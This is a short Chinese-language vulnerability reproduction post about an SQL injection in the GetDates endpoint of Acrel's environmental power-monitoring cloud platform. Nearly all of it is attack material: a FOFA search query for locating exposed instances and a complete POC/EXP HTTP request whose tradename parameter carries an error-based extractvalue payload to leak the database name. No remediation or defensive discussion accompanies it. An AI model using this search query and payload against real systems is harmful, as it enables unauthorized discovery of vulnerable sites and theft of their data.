# 安科瑞智能环保云平台-GetDates-sql注入

# 漏洞复现

FOFA：body="myCss/phone.css" || body="/signInIcon/iconfont.css" || (body="环保用电监管云平台" && body="Acrel") || body="var ecloginname = $(\"#LoginName\").val();" || title="安科瑞环保用电"

POC/EXP：

```
POST /MainMonitor/GetEnterpriseInfoMapByDate/GetDates HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Cookie: ASP.NET_SessionId=ansfwnaiqbeqi5rak0fbmr5s
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

userid=admin&state=1&time=2025-12-20&tradename=1'+and+extractvalue(1,concat(0x7e,database(),0x7e))--+-
```

![image-20260101183732068](assets/image-20260101183732068.png)

